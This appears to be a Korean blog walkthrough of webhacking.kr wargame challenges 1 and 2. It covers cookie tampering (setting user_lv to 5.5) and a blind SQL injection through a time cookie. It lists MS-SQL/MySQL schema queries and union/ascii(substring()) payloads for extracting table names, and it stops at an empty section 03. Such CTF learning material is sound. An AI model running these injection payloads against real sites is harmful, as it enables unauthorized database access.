---
title: "Security: webhacking.kr 01-3"
last_modified_at: 2020-06-07T20:20:02-05:00
categories:
  - Security
tags:
  - webhacking.kr
  - 웹해킹
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---

---
### 01 문제 풀이
---

01번 문제를 들어가자마자 다음과 같은 메세지가 보인다.
{: .notice}

```
---------------------

level : 1
view-source
```
view-source를 클릭하여 들어가면 다음과 같은 소스 코드를 볼 수 있다. 
{: .notice}

```php
<?php
  include "../../config.php";
  if($_GET['view-source'] == 1){ view_source(); }
  if(!$_COOKIE['user_lv']){
    SetCookie("user_lv","1",time()+86400*30,"/challenge/web-01/");
    echo("<meta http-equiv=refresh content=0>");
  }
?>
<html>
<head>
<title>Challenge 1</title>
</head>
<body bgcolor=black>
<center>
<br><br><br><br><br>
<font color=white>
---------------------<br>
<?php
  if(!is_numeric($_COOKIE['user_lv'])) $_COOKIE['user_lv']=1;
  if($_COOKIE['user_lv']>=6) $_COOKIE['user_lv']=1;
  if($_COOKIE['user_lv']>5) solve(1);
  echo "<br>level : {$_COOKIE['user_lv']}";
?>
<br>
<a href=./?view-source=1>view-source</a>
</body>
</html>
```

소스코드를 살펴보면 앞서 봤던 페이지를 출력하는 부분이 있고 일부 화면에는 보이지 않는 부분을 볼 수 있다.
{: .notice}

```
<?php
  if(!is_numeric($_COOKIE['user_lv'])) $_COOKIE['user_lv']=1;
  if($_COOKIE['user_lv']>=6) $_COOKIE['user_lv']=1;
  if($_COOKIE['user_lv']>5) solve(1);
  echo "<br>level : {$_COOKIE['user_lv']}";
?>
```

'user_lv'라는 쿠키를 불러와서 숫자가 아니거나 6 이상이면 1로 초기화 해주고 
6보다는 작고 5보다는 크면 solve(1)을 호출한다는 것을 알 수 있다.
{: .notice}

쿠키값을 수정하기 위해 크롬에 "Edit This Cookie" 이라는 플러그인을 설치했다. 그리고 아래와 같이 5.5 라는 값을 입력해주었다
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제1/1-1.PNG" alt="">
  <figcaption> </figcaption>
</figure> 
Edit This Cookie에 5.5 입력
{: .notice}

<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제1/1-2.PNG" alt="">
  <figcaption></figcaption>
</figure> 
문제를 이미 풀고나서 다시 들어가서 캡처했더니 메세지가 다르다!
{: .notice}
 ---
### 02 문제 풀이
---

문제 2번에 들어가자마자 빈화면에 Restricted area 라는 메세지만 떠있다. html 코드를 보면 힌트가 있을 것 같아 살펴보았다.
{: .notice}

<figure class="align-center">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제2/2-1.PNG" alt="">
  <figcaption> </figcaption>
</figure> 

그랬더니 주석 처리된 부분에 admin.php로 들어갖 말라는 일종의 경고 메세지가 쓰여있는게 눈에 띄었고 뒤늦게 발견했지만 맨위에는 시간 부분이 주석처리 되어있었다.
{: .notice}

<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제2/2-2.PNG" alt="">
  <figcaption> </figcaption>
</figure> 

혹시 몰라 이전에 받은 Edit This Cookie를 통해 쿠키를 살펴보니 time 이라는 쿠키를 볼 수 있었다. 이 쿠키에 아무 값이나 대입해보았다.
{: .notice}

<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제2/2-3.PNG" alt="">
  <figcaption> </figcaption>
</figure> 

그랬더니 주석처리된 시간 부분이 입력한 값 처럼 바뀌었다. 사진에는 없지만 True와 False를 입력했더니 1과 0이 출력되었다. True와 False를 반환하는 것을 보고 Blind SQL Injection을 생각할 수 있었고 다음 사진처럼 입력해보았다.
{: .notice}

<figure class="half">
  <img src="{{ site.url }}{{ site.baseurl }}/assets/images/WebHacking.kr/문제2/2-4.PNG" alt="">
  <figcaption> </figcaption>
</figure> 

DB에 테이블이 몇개가 있는지 확인하기 위해서 다음과 같은 SQL문을 작성하였다
{: .notice}

**여기서 잠깐!**  
데이터베이스별로 시스템 뷰가 존재하는데 이 시스템 뷰로 DB나 테이블을 조회할수있다.
{: .notice--warning}

* **MS-SQL**
* 데이터베이스 조회
	* SELECT * FROM sys.sysdatabases
	* SELECT name, database_id, create_date FROM sys.databases ; 
	* SELECT DB_NAME() -> 현재 DB명 반환
	* SELECT DB_NAME(3) -> DB id 가 3인 DB명 반환
* 테이블 조회
	* SELECT * FROM sys.tables 
	* SELECT * FROM information_schema.tables
* 컬럼 조회
	* SELECT * FROM sys.syscolumns 
	* SELECT column_name FROM information_schema.columns WHERE table_name = "테이블명"
* 각테이블 상세 컬럼 정보 
	* select * from sys.systypes 
{: .notice--info}

* **My SQL, Maria DB**
* 데이터베이스 조회
	* SELECT DATABASE(): 현재 사용중인 DB명
	* SELECT 1 FROM Information_schema.SCHEMATA WHERE SCHEMA_NAME = 'DB명': 해당 DB 존재여부 확인(있으면 1, 없으면 0)
	* SELECT SCHEMA_NAME FROM information_schema.SCHEMATA WHERE SCHEMA_NAME = 'DB명'; 
* 테이블 조회
	* SELECT 1 FROM information_schema.tables WHERE table_schema = 'DB명'  AND table_name = '테이블명': 테이블의 존재여부 확인(있으면 1, 없으면 0)
	* SELECT TABLE_NAME, TABLE_COMMENT FROM information_schema.tables WHERE table_schema = 'DB명'
* 컬럼 조회
	* SELECT 1 FROM Information_schema.columns WHERE table_schema = 'DB명'  AND table_name = '테이블명'  AND column_name = '컬럼명' -> 컬럼의 존재여부 확인(있으면 1, 없으면 0)
	* SELECT column_name FROM information_schema.columns WHERE table_schema = 'DB명'  AND table_name = '테이블명' 
{: .notice--info}

**풀이를 위해 알아둬야할 SQL문**  
{: .notice--info}
```
select count(table_name) from information_schema.tables where table_schema=database()
//현재 위치한 데이터베이스의 테이블의 수를 검색
select length(table_name) from information_schema.tables where table_schema=database() limit 0, 1
//현재 위치한 데이터베이스의 테이블 중 첫 번째 테이블명의 길이를 검색

//limit pos, len: 출력 레코드의 개수를 제한하는 함수로 pos는 시작 행을 의미하며 0부터 시작, len은 개수를 의미한다. limit 0,1은 첫 번째부터 1개의 레코드를 의미하며, pos값을 1씩 증가시키면 다음 레코드를 하나씩 순서대로 추출할 수 있다.
//table의 이름을 불러오는 구문은 union select table_name from information_schema.tables where table_schema = database()입니다.
//이때, web에서는 가장 상위에 있는 하나의 줄만을 가져오기 때문에 limit절을 사용해주어야 합니다.

union select table_name from information_schema.tables where table_schema = database() limit 0,1
String.substring(start,end)
//문자열  start위치 부터 end전까지 문자열

select ascii(substring(table_name, 1, 1)) from information_schema.tables where table_schema=database() limit 0,1
//현재 위치한 데이터베이스의 테이블 중 첫 번째 테이블명의 첫 번째 단어를 아스키코드로 출력

select ascii(substring(table_name, 2, 1)) from information_schema.tableswhere table_schema=database() limit 0,1
//두 번째 단어를 알아냅니다.

select length(table_name) from information_schema.tables where table_schema=database() limit 1, 1
//두 번째 테이블명의 길이가 나옵니다.
```

---
### 03 문제 풀이
---